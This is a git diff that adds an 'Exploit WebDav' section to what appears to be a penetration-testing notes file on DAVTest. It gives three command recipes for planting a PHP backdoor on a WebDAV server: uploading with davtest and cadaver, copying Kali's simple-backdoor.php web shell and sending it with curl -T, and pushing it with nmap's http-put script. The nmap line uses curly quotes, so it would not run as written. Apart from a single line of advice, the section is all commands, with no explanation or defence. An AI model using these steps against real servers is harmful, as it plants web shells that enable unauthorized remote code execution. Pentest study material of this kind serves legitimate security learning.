@@ -39,3 +39,28 @@ DAVTest supports:
 davtest -url http://10.10.10.10
 ```
 
+## Exploit WebDav
+
+If one method fails, another should be tested. If nothing works, Find a different exploit!
+
+Method 1:
+
+```text
+davtest -url http://$target/webdav
+cadaver http://$target/webdav
+> put test.php
+```
+
+Method 2:
+
+```text
+cp /usr/share/webshells/php/simple-backdoor.php bytef.php
+curl -T 'bytef.php' 'http://ip/webdav/'
+```
+
+Method 3:
+
+```text
+nmap -p 80 $ip_address –script http-put –script-args http-put.url=’/webdav/bytef.php’,http-put.file=’backdoor/bytef.php’
+```
+
